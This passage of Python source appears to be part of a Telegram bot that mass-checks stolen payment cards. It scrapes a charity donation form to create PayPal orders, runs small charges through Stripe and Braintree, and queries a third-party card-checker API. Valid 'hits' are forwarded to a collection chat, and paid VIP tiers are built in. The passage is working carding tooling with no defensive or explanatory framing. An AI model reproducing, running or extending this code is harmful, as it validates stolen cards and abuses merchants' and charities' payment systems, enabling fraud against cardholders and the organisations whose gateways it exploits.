        if urlparse(self.target_url).query:
            self.inurl += f"?{urlparse(self.target_url).query}"
        self.email = f"{random.choice(self.first_name)}{random.randint(100,999)}@gmail.com"
        self.is_valid_gateway = True
        self._init_and_extract()
        self._get_access_token()
        self._get_client_token()

    def _init_and_extract(self):
        try:
            headers = {'user-agent': self.uu.random, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'accept-language': 'en-US,en;q=0.9'}
            response = self.r.get(f'https://{self.url}{self.inurl}', headers=headers, timeout=15)
            self.cookies = dict(response.cookies)
            html = response.text
            if not any(x in html.lower() for x in ['paypal', 'client-id', 'give-form']):
                self.is_valid_gateway = False
                return
            self._extract_client_id(html)
            self._extract_form_data(html)
            self._extract_ajax_url(html)
        except:
            self.is_valid_gateway = False

    def _extract_client_id(self, html):
        patterns = [
            r'client-id="([^"]+)"', r'client_id["\']?\s*[:=]\s*["\']([^"\']+)',
            r'data-client-id="([^"]+)"', r'clientId["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{20,})',
            r'paypal_client_id["\']?\s*[:=]\s*["\']([^"\']+)',
            r'PAYPAL_CLIENT_ID["\']?\s*[:=]\s*["\']([^"\']+)'
        ]
        for pattern in patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                self.client_id = match.group(1)
                return
        script_matches = re.findall(r'<script[^>]*>(.*?)</script>', html, re.DOTALL)
        for script in script_matches:
            for pattern in patterns:
                match = re.search(pattern, script, re.IGNORECASE)
                if match:
                    self.client_id = match.group(1)
                    return

    def _extract_form_data(self, html):
        inputs = re.findall(r'<input[^>]*type="hidden"[^>]*name="([^"]+)"[^>]*value="([^"]*)"', html)
        for name, value in inputs:
            self.form_data[name] = value
        data_attrs = re.findall(r'data-([\w-]+)="([^"]+)"', html)
        for attr_name, attr_value in data_attrs:
            if any(k in attr_name.lower() for k in ['give', 'paypal', 'form', 'client', 'merchant', 'nonce', 'hash']):
                self.form_data[attr_name] = attr_value

    def _extract_ajax_url(self, html):
        if 'admin-ajax.php' in html:
            self.ajax_url = f'https://{self.url}/wp-admin/admin-ajax.php'
        elif 'wc-ajax' in html:
            self.ajax_url = f'https://{self.url}/?wc-ajax=checkout'

    def _get_access_token(self):
        if not self.client_id:
            return None
        try:
            headers = {'user-agent': self.uu.random, 'accept': 'application/json', 'content-type': 'application/x-www-form-urlencoded'}
            response = self.r.post('https://api-m.paypal.com/v1/oauth2/token', headers=headers, data={'grant_type': 'client_credentials'}, auth=(self.client_id, ''), timeout=15)
            if response.status_code == 200:
                self.access_token = response.json().get('access_token')
                return self.access_token
        except:
            pass
        return None

    def _get_client_token(self):
        if not self.ajax_url:
            return None
        try:
            actions = ['give_paypal_commerce_get_client_token', 'get_client_token', 'paypal_get_client_token']
            for action in actions:
                data = {'action': action, 'form-id': self.form_data.get('give-form-id', '')}
                headers = {'user-agent': self.uu.random, 'x-requested-with': 'XMLHttpRequest', 'origin': f'https://{self.url}', 'referer': f'https://{self.url}{self.inurl}', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8'}
                response = self.r.post(self.ajax_url, data=data, headers=headers, cookies=self.cookies, timeout=15)
                if response.status_code == 200 and response.text:
                    try:
                        json_data = response.json()
                        if 'data' in json_data:
                            if isinstance(json_data['data'], dict):
                                self.client_token = json_data['data'].get('client_token') or json_data['data'].get('token')
                            elif isinstance(json_data['data'], str):
                                self.client_token = json_data['data']
                            if self.client_token:
                                return self.client_token
                    except:
                        pass
            return None
        except:
            return None

    def _create_order(self):
        if not self.is_valid_gateway:
            return None
        if self.ajax_url:
            order_id = self._create_order_givewp()
            if order_id:
                return order_id
        if self.access_token:
            order_id = self._create_order_direct()
            if order_id:
                return order_id
        return None

    def _create_order_givewp(self):
        if not self.ajax_url:
            return None
        form_data = self.form_data.copy()
        form_data.update({
            'give-amount': self.donation,
            'payment-mode': 'paypal-commerce',
            'give_first': random.choice(self.first_name),
            'give_last': random.choice(self.last_name),
            'give_email': self.email,
            'give-gateway': 'paypal-commerce',
        })
        headers = {'user-agent': self.uu.random, 'accept': 'application/json, text/javascript, */*; q=0.01', 'x-requested-with': 'XMLHttpRequest', 'origin': f'https://{self.url}', 'referer': f'https://{self.url}{self.inurl}', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8'}
        actions = ['give_paypal_commerce_create_order', 'give_create_order', 'create_order']
        for action in actions:
            params = {'action': action}
            try:
                response = self.r.post(self.ajax_url, params=params, headers=headers, data=form_data, cookies=self.cookies, timeout=15)
                if response.status_code == 200 and response.text:
                    try:
                        json_data = response.json()
                        if 'data' in json_data:
                            if isinstance(json_data['data'], dict) and 'id' in json_data['data']:
                                return json_data['data']['id']
                            elif isinstance(json_data['data'], str):
                                return json_data['data']
                        if 'id' in json_data:
                            return json_data['id']
                    except:
                        pass
            except:
                continue
        return None

    def _create_order_direct(self):
        if not self.access_token:
            return None
        try:
            headers = {'authorization': f'Bearer {self.access_token}', 'content-type': 'application/json', 'user-agent': self.uu.random, 'accept': 'application/json'}
            data = {'intent': 'CAPTURE', 'purchase_units': [{'amount': {'currency_code': self.currency, 'value': self.donation}}], 'application_context': {'shipping_preference': 'NO_SHIPPING', 'user_action': 'PAY_NOW'}}
            response = self.r.post('https://api-m.paypal.com/v2/checkout/orders', headers=headers, json=data, timeout=15)
            if response.status_code in [200, 201]:
                return response.json().get('id')
        except:
            pass
        return None

    def _approve_order(self, order_id):
        if self.ajax_url:
            result = self._approve_order_givewp(order_id)
            if result:
                return result
        if self.access_token:
            try:
                headers = {'authorization': f'Bearer {self.access_token}', 'content-type': 'application/json', 'user-agent': self.uu.random}
                response = self.r.post(f'https://api-m.paypal.com/v2/checkout/orders/{order_id}/capture', headers=headers, timeout=15)
                return response
            except:
                pass
        return None

    def _approve_order_givewp(self, order_id):
        if not self.ajax_url:
            return None
        form_data = self.form_data.copy()
        form_data.update({
            'give-amount': self.donation,
            'payment-mode': 'paypal-commerce',
            'give_first': random.choice(self.first_name),
            'give_last': random.choice(self.last_name),
            'give_email': self.email,
            'give-gateway': 'paypal-commerce',
        })
        headers = {'user-agent': self.uu.random, 'accept': 'application/json, text/javascript, */*; q=0.01', 'x-requested-with': 'XMLHttpRequest', 'origin': f'https://{self.url}', 'referer': f'https://{self.url}{self.inurl}', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8'}
        actions = ['give_paypal_commerce_approve_order', 'give_approve_order', 'approve_order']
        for action in actions:
            params = {'action': action, 'order': order_id}
            try:
                response = self.r.post(self.ajax_url, params=params, headers=headers, data=form_data, cookies=self.cookies, timeout=15)
                if response.status_code == 200:
                    return response
            except:
                continue
        return None

    def _clean_response(self, text):
        if not text:
            return "DECLINED"
        text_strip = text.strip()
        text_lower = text_strip.lower()
        if text_lower == 'true':
            return 'CHARGE 1.0'
        if 'insufficient' in text_lower:
            return 'INSUFFICIENT_FUNDS'
        for pr in PAYPAL_RESPONSES:
            if pr in text_strip.upper():
                if pr == 'ORDER_NOT_APPROVED':
                    return "Payer cannot pay for this transaction."
                return pr
        if len(text_strip) < 100:
            return "PAYER_ACTION_REQUIRED"
        return text_strip[:200]

    def Charge(self, ccx):
        try:
            if not self.is_valid_gateway:
                return "INVALID_GATEWAY"
            parts = ccx.strip().split("|")
            if len(parts) < 4:
                return "Invalid card format"
            n, mm, yy, cvc = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
            if "20" in yy:
                yy = yy.split("20")[1]
            expiry = f"20{yy}-{mm}"
            order_id = self._create_order()
            if not order_id:
                return "Create Order Failed"
            auth_tokens = []
            if self.client_token:
                auth_tokens.append(self.client_token)
            if self.access_token:
                auth_tokens.append(self.access_token)
            if self.client_id:
                auth_tokens.append(self.client_id)
            confirm_json = {}
            confirm_text = ""
            for auth_token in auth_tokens:
                he4 = {'authorization': f'Bearer {auth_token}', 'paypal-client-metadata-id': self.client_id or '', 'user-agent': self.uu.random}
                da3 = {'payment_source': {'card': {'number': n, 'expiry': expiry, 'security_code': cvc, 'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}}}}, 'application_context': {'vault': False}}
                try:
                    confirm_res = self.r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source', headers=he4, json=da3, timeout=15)
                    confirm_text = confirm_res.text
                    if confirm_res.status_code == 200:
                        try:
                            confirm_json = confirm_res.json()
                        except:
                            confirm_json = {}
                        break
                except:
                    continue
            if isinstance(confirm_json, dict):
                if 'details' in confirm_json and len(confirm_json['details']) > 0:
                    detail = confirm_json['details'][0]
                    issue = detail.get('issue', '')
                    description = detail.get('description', '')
                    if issue:
                        if issue == 'ORDER_NOT_APPROVED':
                            return "Payer cannot pay for this transaction."
                        if description:
                            return f"{issue}: {description}"
                        return issue
                if 'name' in confirm_json:
                    name = confirm_json.get('name', '')
                    if name in PAYPAL_RESPONSES:
                        msg = confirm_json.get('message', '')
                        if msg:
                            return f"{name}: {msg}"
                        return name
            approve_res = self._approve_order(order_id)
            text = approve_res.text if approve_res else ''
            if text:
                return self._clean_response(text)
            return "DECLINED"
        except Exception as e:
            return f"Error: {e}"


async def check_card_api(card_full, gateway_url):
    async with api_semaphore:
        try:
            loop = asyncio.get_event_loop()
            def run_check():
                pp_engine = PayPalCommerce(target_url=gateway_url if gateway_url else 'https://www.sandiegoyokohamasistercity.org/donations/donation-form/')
                return pp_engine.Charge(card_full)
            result_raw = await loop.run_in_executor(None, run_check)
            await asyncio.sleep(0.5)
            result = str(result_raw)
            result_lower = result.lower()
            if result.startswith("CHARGE"):
                return "approved", result_raw
            elif "insufficient" in result_lower:
                return "live", result_raw
            else:
                if result.startswith("Error:"):
                    result = result.replace("Error:", "").strip()
                if result and result != "DECLINED":
                    return "declined", result
                return "declined", "Declined"
        except Exception as e:
            return "declined", f"Error: {e}"


# ==================== Stripe ====================
def check_stripe_sync(card, key_id="1"):
    try:
        if not STRIPE_KEYS:
            return "No Stripe keys"
        key = STRIPE_KEYS.get(str(key_id))
        if not key:
            return f"Key {key_id} not found"
        pk = key.get("pk", "")
        sk = key.get("sk", "")
        if not pk or not sk:
            return f"Key {key_id}: Invalid keys"
        parts = card.strip().split("|")
        if len(parts) != 4:
            return "INVALID FORMAT"
        cc_number, exp_month, exp_year, cvc = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
        if len(exp_year) == 2:
            exp_year = "20" + exp_year
        session = requests.Session()
        session.verify = False
        headers = {"Authorization": f"Bearer {pk}", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"}
        data = {"card[number]": cc_number, "card[exp_month]": exp_month, "card[exp_year]": exp_year, "card[cvc]": cvc}
        r = session.post("https://api.stripe.com/v1/tokens", headers=headers, data=data, timeout=30)
        if r.status_code != 200:
            error = r.json().get("error", {})
            error_msg = error.get("message", "Unknown")
            decline_code = error.get("decline_code", "")
            error_code = error.get("code", "")
            if decline_code:
                return f"Key {key_id} | {decline_code}: {error_msg}"
            elif error_code:
                return f"Key {key_id} | {error_code}: {error_msg}"
            else:
                return f"Key {key_id} | {error_msg[:50]}"
        token_id = r.json()["id"]
        headers = {"Authorization": f"Bearer {sk}", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"}
        data = {"amount": "100", "currency": "usd", "source": token_id, "description": "WAFA"}
        r = session.post("https://api.stripe.com/v1/charges", headers=headers, data=data, timeout=30)
        if r.status_code == 200:
            status = r.json().get("status", "")
            if status == "succeeded":
                return f"Key {key_id} | CHARGE $1"
            elif status in ["pending", "processing"]:
                return f"Key {key_id} | LIVE"
            else:
                return f"Key {key_id} | {status}"
        else:
            error = r.json().get("error", {})
            error_msg = error.get("message", "Unknown")
            decline_code = error.get("decline_code", "")
            error_code = error.get("code", "")
            if decline_code:
                return f"Key {key_id} | {decline_code}: {error_msg}"
            elif error_code:
                return f"Key {key_id} | {error_code}: {error_msg}"
            else:
                return f"Key {key_id} | {error_msg[:50]}"
    except Exception as e:
        return f"Key {key_id} | Error: {str(e)[:50]}"
    finally:
        try:
            session.close()
        except:
            pass


# ==================== Auth $0 ====================
def check_auth_sync(card):
    try:
        session = requests.Session()
        session.verify = False
        data = MultipartEncoder({'data': (None, card),})
        headers = {
            'authority': 'uncoder.eu.org', 'accept': '*/*',
            'accept-language': 'ar-CA,ar;q=0.9,en-CA;q=0.8,en;q=0.7,en-US;q=0.6',
            'content-type': data.content_type, 'origin': 'https://uncoder.eu.org',
            'referer': 'https://uncoder.eu.org/cc-checker/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
        }
        start_time = time.time()
        response = session.post('https://uncoder.eu.org/cc-checker/api.php', headers=headers, data=data)
        end_time = time.time()
        taken = round(end_time - start_time, 2)
        try:
            json_data = response.json()
            message = json_data.get('message', '')
            if 'approved' in message.lower():
                return {'status': 'approved', 'message': 'Approved — $0 auth', 'taken': taken}
            elif 'insufficient' in message.lower():
                return {'status': 'live', 'message': 'Insufficient Funds', 'taken': taken}
            else:
                return {'status': 'declined', 'message': message[:80], 'taken': taken}
        except:
            return {'status': 'error', 'message': 'Error parsing response', 'taken': taken}
    except Exception as e:
        return {'status': 'error', 'message': str(e)[:50], 'taken': 0}
    finally:
        try:
            session.close()
        except:
            pass


# ==================== Braintree Sync Wrapper ====================
def check_braintree_sync(card):
    """Wrapper للـ Braintree Checker عشان يشتغل في الـ Mass"""
    try:
        checker = BraintreeChecker()
        result = checker.check(card)
        return result
    except Exception as e:
        return {'card': card, 'status': 'ERROR', 'message': str(e)[:120],
                'time': 0, 'bin': card.split('|')[0][:6] if '|' in card else '',
                'bin_info': ''}


# ==================== Hit Sender ====================
async def send_hit(context, chat_id, hit_counter, username, status_text, response, gateway_name):
    hit_text = f"""⚡ 𝗵𝗶𝘁 𝗗𝗲𝘁𝗲𝗰𝘁𝗲𝗱 #{hit_counter} 📌
- - - - - - - - - - - - - - - - - - - - - -
⚡ 𝐔𝐬𝐞𝐫: @{username}
⚡ 𝐒𝐭𝐚𝐭𝐮𝐬: {status_text}
⚡ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>{response}</code>
⚡ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: {gateway_name}
- - - - - - - - - - - - - - - - - - - - - -
🤖 checker v1"""
    try:
        await context.bot.send_message(chat_id=HIT_CHAT_ID, text=premium_emoji(hit_text), parse_mode="HTML")
    except:
        pass


# ==================== Braintree File Processing ====================
async def process_braintree_file(file_path, chat_id, context, gateway_name="Braintree Charge 5$", username="Unknown"):
    global hit_counter
    user_id = chat_id
    stop_users[user_id] = False
    try:
        approved = live = declined = 0
        card_counter = 0
        panel_msg = await context.bot.send_message(chat_id, premium_emoji("💳 Braintree Charge 5$ Checking..."), parse_mode="HTML")
        loop = asyncio.get_event_loop()
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            all_cards = f.readlines()
        valid_cards = []
        for line in all_cards:
            match = re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}', line)
            if match:
                valid_cards.append(match[0])
        total_cards = len(valid_cards)
        if total_cards == 0:
            await context.bot.send_message(chat_id, premium_emoji("❌ No valid cards found."), parse_mode="HTML")
            return
        for card_full in valid_cards:
            if stop_users.get(user_id):
                await context.bot.send_message(chat_id, premium_emoji("🛑 Stopped."), parse_mode="HTML")
                return
            card_counter += 1
            start_time = time.time()
            result_dict = await loop.run_in_executor(None, check_braintree_sync, card_full)
            taken = round(time.time() - start_time, 2)
            status = result_dict.get('status', 'ERROR')
            message = result_dict.get('message', '')
            bin_info = result_dict.get('bin_info', '')
            if status == 'CHARGE':
                approved += 1
                text = await format_braintree_response(card_full, result_dict, taken, user_id, "Mass")
                msg = await context.bot.send_message(chat_id, text, parse_mode="HTML")
                try:
                    await msg.pin(disable_notification=True)
                except:
                    pass
                hit_counter += 1
                await send_hit(context, chat_id, hit_counter, username, "🔥 Charge 5$", message, gateway_name)
            elif status == 'APPROVED':
                live += 1
                text = await format_braintree_response(card_full, result_dict, taken, user_id, "Mass")
                await context.bot.send_message(chat_id, text, parse_mode="HTML")
                hit_counter += 1
                await send_hit(context, chat_id, hit_counter, username, "💵 " + message, message, gateway_name)
            else:
                declined += 1
            keyboard = [[InlineKeyboardButton("🛑 STOP", callback_data=f"stop_mass_{user_id}")]]
            panel = f"""⚡ {gateway_name}
⏱ 𝐓𝐢𝐦𝐞: <code>{taken}s</code>
⚡ 𝐑𝐞𝐬𝐮𝐥𝐭: <code>{status}: {message[:60]}</code>
- - - - - - - - - - - - - - - -
🔥 𝐂𝐡𝐚𝐫𝐠𝐞: <code>{approved}</code>
💵 𝐋𝐢𝐯𝐞: <code>{live}</code>
❌ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝: <code>{declined}</code>
- - - - - - - - - - - - - - - -
💳 𝐂𝐚𝐫𝐝: <code>{card_full}</code>
- - - - - - - - - - - - - - - -
📊 𝐓𝐨𝐭𝐚𝐥: <code>{card_counter}/{total_cards}</code>"""
            try:
                await panel_msg.edit_text(premium_emoji(panel), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
            except:
                pass
            await asyncio.sleep(1)
        await context.bot.send_message(chat_id, premium_emoji(f"🚀 {gateway_name} complete!\n📊 Total: {card_counter} | 🔥 {approved} | 💵 {live} | ❌ {declined}"), parse_mode="HTML")
    except asyncio.CancelledError:
        await context.bot.send_message(chat_id, premium_emoji("🛑 Stopped."), parse_mode="HTML")
    except Exception as e:
        await context.bot.send_message(chat_id, premium_emoji(f"❌ Error: {e}"), parse_mode="HTML")


# ==================== PayPal File Processing ====================
async def process_paypal_file(file_path, chat_id, context, gateway_name="PayPal", username="Unknown"):
    global gateway_index, hit_counter
    user_id = chat_id
    stop_users[user_id] = False
    try:
        approved = live = declined = 0
        card_counter = 0
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            all_cards = f.readlines()
        valid_cards = []
        for line in all_cards:
            match = re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}', line)
            if match:
                valid_cards.append(match[0])
        total_cards = len(valid_cards)
        if total_cards == 0:
            await context.bot.send_message(chat_id, premium_emoji("❌ No valid cards found."), parse_mode="HTML")
            return
        panel_msg = await context.bot.send_message(chat_id, premium_emoji("🎯 Start Checking..."), parse_mode="HTML")
        for card_full in valid_cards:
            if stop_users.get(user_id):
                await context.bot.send_message(chat_id, premium_emoji("🛑 Stopped."), parse_mode="HTML")
                return
            card_counter += 1
            start_time = time.time()
            gateway_num = 0
            gateway_url = None
            if GATEWAYS:
                gateway_num = ((card_counter - 1) % len(GATEWAYS)) + 1
                gateway_url = GATEWAYS[(card_counter - 1) % len(GATEWAYS)]
            status, response = await check_card_api(card_full, gateway_url)
            taken = round(time.time() - start_time, 2)
            if status == "approved":
                approved += 1
                text = await format_response(card_full, status, response, taken, gateway_url, gateway_num, user_id, "Mass")
                msg = await context.bot.send_message(chat_id, text, parse_mode="HTML")
                try:
                    await msg.pin(disable_notification=True)
                except:
                    pass
                hit_counter += 1
                status_text = "🔥 Charge" if "CHARGE" in str(response).upper() else "🔥 Approved"
                await send_hit(context, chat_id, hit_counter, username, status_text, response, gateway_name)
            elif status == "live":
                live += 1
                text = await format_response(card_full, status, response, taken, gateway_url, gateway_num, user_id, "Mass")
                await context.bot.send_message(chat_id, text, parse_mode="HTML")
                hit_counter += 1
                await send_hit(context, chat_id, hit_counter, username, "💵 Insufficient Funds", response, gateway_name)
            else:
                declined += 1
            keyboard = [[InlineKeyboardButton("🛑 STOP", callback_data=f"stop_mass_{user_id}")]]
            panel = f"""⚡ {gateway_name}
🔗 𝐆𝐚𝐭𝐞 #{gateway_num if gateway_num else 'N/A'}
⏱ 𝐓𝐢𝐦𝐞: <code>{taken}s</code>
⚡ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>{response}</code>
- - - - - - - - - - - - - - - -
🔥 𝐂𝐡𝐚𝐫𝐠𝐞: <code>{approved}</code>
💵 𝐋𝐢𝐯𝐞: <code>{live}</code>
❌ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝: <code>{declined}</code>
- - - - - - - - - - - - - - - -
💳 𝐂𝐚𝐫𝐝: <code>{card_full}</code>
- - - - - - - - - - - - - - - -
📊 𝐓𝐨𝐭𝐚𝐥: <code>{card_counter}/{total_cards}</code>"""
            try:
                await panel_msg.edit_text(premium_emoji(panel), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
            except:
                pass
            await asyncio.sleep(1)
        await context.bot.send_message(chat_id, premium_emoji(f"🚀 {gateway_name} complete!\n📊 Total: {card_counter} | 🔥 {approved} | 💵 {live} | ❌ {declined}"), parse_mode="HTML")
    except asyncio.CancelledError:
        await context.bot.send_message(chat_id, premium_emoji("🛑 Stopped."), parse_mode="HTML")
    except Exception as e:
        await context.bot.send_message(chat_id, premium_emoji(f"❌ Error: {e}"), parse_mode="HTML")


# ==================== Stripe File Processing ====================
async def process_stripe_file(file_path, chat_id, context, gateway_name="Stripe", username="Unknown"):
    global hit_counter
    if not STRIPE_KEYS:
        await context.bot.send_message(chat_id, premium_emoji("❌ No Stripe keys."), parse_mode="HTML")
        return
    user_id = chat_id
    stop_users[user_id] = False
    try:
        approved = live = declined = 0
        card_counter = 0
        panel_msg = await context.bot.send_message(chat_id, premium_emoji("💳 Stripe Checking..."), parse_mode="HTML")
        loop = asyncio.get_event_loop()
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            all_cards = f.readlines()
        valid_cards = []
        for line in all_cards:
            match = re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}', line)
            if match:
                valid_cards.append(match[0])
        total_cards = len(valid_cards)
        for card_full in valid_cards:
            if stop_users.get(user_id):
                await context.bot.send_message(chat_id, premium_emoji("🛑 Stopped."), parse_mode="HTML")
                return
            card_counter += 1
            start_time = time.time()
            keys_list = list(STRIPE_KEYS.keys())
            total_keys = len(keys_list)
            if total_keys == 0:
                await context.bot.send_message(chat_id, premium_emoji("❌ No Stripe keys."), parse_mode="HTML")
                return
            key_id = keys_list[(card_counter - 1) % total_keys]
            result = await loop.run_in_executor(None, check_stripe_sync, card_full, key_id)
            taken = round(time.time() - start_time, 2)
            result_upper = str(result).upper()
            if "CHARGE" in result_upper:
                approved += 1
                text = await format_stripe_response(card_full, result, taken, user_id, "Mass")
                msg = await context.bot.send_message(chat_id, text, parse_mode="HTML")
                try:
                    await msg.pin(disable_notification=True)
                except:
                    pass
                hit_counter += 1
                await send_hit(context, chat_id, hit_counter, username, "🔥 Charge", result, gateway_name)
            elif "INSUFFICIENT" in result_upper or "LIVE" in result_upper:
                live += 1
                text = await format_stripe_response(card_full, result, taken, user_id, "Mass")
                await context.bot.send_message(chat_id, text, parse_mode="HTML")
                hit_counter += 1
                await send_hit(context, chat_id, hit_counter, username, "💵 Insufficient Funds", result, gateway_name)
            else:
                declined += 1
            keyboard = [[InlineKeyboardButton("🛑 STOP", callback_data=f"stop_mass_{user_id}")]]
            panel = f"""⚡ {gateway_name}
🔑 𝐊𝐞𝐲 #{key_id}
⏱ 𝐓𝐢𝐦𝐞: <code>{taken}s</code>
⚡ 𝐑𝐞𝐬𝐮𝐥𝐭: <code>{result[:80]}</code>
- - - - - - - - - - - - - - - -
🔥 𝐂𝐡𝐚𝐫𝐠𝐞: <code>{approved}</code>
💵 𝐋𝐢𝐯𝐞: <code>{live}</code>
❌ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝: <code>{declined}</code>
- - - - - - - - - - - - - - - -
💳 𝐂𝐚𝐫𝐝: <code>{card_full}</code>
- - - - - - - - - - - - - - - -
📊 𝐓𝐨𝐭𝐚𝐥: <code>{card_counter}/{total_cards}</code>"""
            try:
                await panel_msg.edit_text(premium_emoji(panel), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
            except:
                pass
            await asyncio.sleep(1)
        await context.bot.send_message(chat_id, premium_emoji("🚀 Stripe complete."), parse_mode="HTML")
    except asyncio.CancelledError:
        await context.bot.send_message(chat_id, premium_emoji("🛑 Stopped."), parse_mode="HTML")
    except Exception as e:
        await context.bot.send_message(chat_id, premium_emoji(f"❌ Error: {e}"), parse_mode="HTML")


# ==================== Auth File Processing ====================
async def process_auth_file(file_path, chat_id, context, gateway_name="Auth $0", username="Unknown"):
    global hit_counter
    user_id = chat_id
    stop_users[user_id] = False
    try:
        approved = live = declined = 0
        card_counter = 0
        panel_msg = await context.bot.send_message(chat_id, premium_emoji("🛡 Auth Checking..."), parse_mode="HTML")
        loop = asyncio.get_event_loop()
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            all_cards = f.readlines()
        valid_cards = []
        for line in all_cards:
            match = re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}', line)
            if match:
                valid_cards.append(match[0])
        total_cards = len(valid_cards)
        for card_full in valid_cards:
            if stop_users.get(user_id):
                await context.bot.send_message(chat_id, premium_emoji("🛑 Stopped."), parse_mode="HTML")
                return
            card_counter += 1
            start_time = time.time()
            result_dict = await loop.run_in_executor(None, check_auth_sync, card_full)
            taken = round(time.time() - start_time, 2)
            status = result_dict.get('status', 'declined')
            if status == "approved":
                approved += 1
                text = await format_auth_response(card_full, result_dict, taken, user_id, "Mass")
                msg = await context.bot.send_message(chat_id, text, parse_mode="HTML")
                try:
                    await msg.pin(disable_notification=True)
                except:
                    pass
                hit_counter += 1
                await send_hit(context, chat_id, hit_counter, username, "🔥 Approved", result_dict.get('message', ''), gateway_name)
            elif status == "live":
                live += 1
                text = await format_auth_response(card_full, result_dict, taken, user_id, "Mass")
                await context.bot.send_message(chat_id, text, parse_mode="HTML")
                hit_counter += 1
                await send_hit(context, chat_id, hit_counter, username, "💵 Insufficient Funds", result_dict.get('message', ''), gateway_name)
            else:
                declined += 1
            message = result_dict.get('message', '')
            keyboard = [[InlineKeyboardButton("🛑 STOP", callback_data=f"stop_mass_{user_id}")]]
            panel = f"""⚡ {gateway_name}
⏱ 𝐓𝐢𝐦𝐞: <code>{taken}s</code>
⚡ 𝐑𝐞𝐬𝐮𝐥𝐭: <code>{message[:80]}</code>
- - - - - - - - - - - - - - - -
🔥 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝: <code>{approved}</code>
💵 𝐋𝐢𝐯𝐞: <code>{live}</code>
❌ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝: <code>{declined}</code>
- - - - - - - - - - - - - - - -
💳 𝐂𝐚𝐫𝐝: <code>{card_full}</code>
- - - - - - - - - - - - - - - -
📊 𝐓𝐨𝐭𝐚𝐥: <code>{card_counter}/{total_cards}</code>"""
            try:
                await panel_msg.edit_text(premium_emoji(panel), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
            except:
                pass
            await asyncio.sleep(1)
        await context.bot.send_message(chat_id, premium_emoji("🚀 Auth complete."), parse_mode="HTML")
    except asyncio.CancelledError:
        await context.bot.send_message(chat_id, premium_emoji("🛑 Stopped."), parse_mode="HTML")
    except Exception as e:
        await context.bot.send_message(chat_id, premium_emoji(f"❌ Error: {e}"), parse_mode="HTML")
        
        # ==================== Formatters ====================
async def format_response(card_full, status, response, taken, gateway_url, gateway_num, user_id, mode="Single"):
    bin_number = card_full.split("|")[0][:6]
    info, bank, country = await get_bin_info(bin_number)
    if status == "approved":
        status_emoji = "🔥"
        status_text = "Charge"
    elif status == "live":
        status_emoji = "💵"
        status_text = "Insufficient Funds"
    else:
        status_emoji = "❌"
        status_text = "Declined"
    if user_id in ADMINS:
        user_status = "Admin 👑"
        gateway_info = f"\n🔗 Gate #{gateway_num}: <code>{gateway_url}</code>" if gateway_url else ""
    elif user_id in VIP_USERS and VIP_USERS[user_id] > time.time():
        user_status = "Premium 💎"
        gateway_info = f"\n🔗 Gate #{gateway_num}" if gateway_num else ""
    else:
        user_status = "Free User 🤖"
        gateway_info = ""
    return premium_emoji(f"""💳 #PayPal [{mode}]
- - - - - - - - - - - - - - - - - - - - - -
💳 𝐂𝐚𝐫𝐝: <code>{card_full}</code>
⚡ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>{response}</code>
{status_emoji} 𝐒𝐭𝐚𝐭𝐮𝐬: {status_text}
⏱ 𝐓𝐢𝐦𝐞: <code>{taken}s</code>
- - - - - - - - - - - - - - - - - - - - - -
📌 𝐈𝐧𝐟𝐨: <code>{info}</code>
🏦 𝐁𝐚𝐧𝐤: <code>{bank}</code>
🌐 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country}</code>
👤 𝐑𝐞𝐪 𝐁𝐲: <code>{user_id}</code> ({user_status}){gateway_info}
- - - - - - - - - - - - - - - - - - - - - -
🤖 checker v1""")


async def format_stripe_response(card_full, result, taken, user_id, mode="Single"):
    bin_number = card_full.split("|")[0][:6]
    info, bank, country = await get_bin_info(bin_number)
    result_upper = str(result).upper()
    if "CHARGE" in result_upper or "SUCCEEDED" in result_upper:
        status_emoji = "🔥"
        status_text = "Charge $1"
    elif "INSUFFICIENT" in result_upper:
        status_emoji = "💵"
        status_text = "Insufficient Funds"
    elif "LIVE" in result_upper:
        status_emoji = "💵"
        status_text = "Live"
    else:
        status_emoji = "❌"
        status_text = "Declined"
    if user_id in ADMINS:
        user_status = "Admin 👑"
    elif user_id in VIP_USERS and VIP_USERS[user_id] > time.time():
        user_status = "Premium 💎"
    else:
        user_status = "Free User 🤖"
    return premium_emoji(f"""💳 #Stripe [{mode}]
- - - - - - - - - - - - - - - - - - - - - -
💳 𝐂𝐚𝐫𝐝: <code>{card_full}</code>
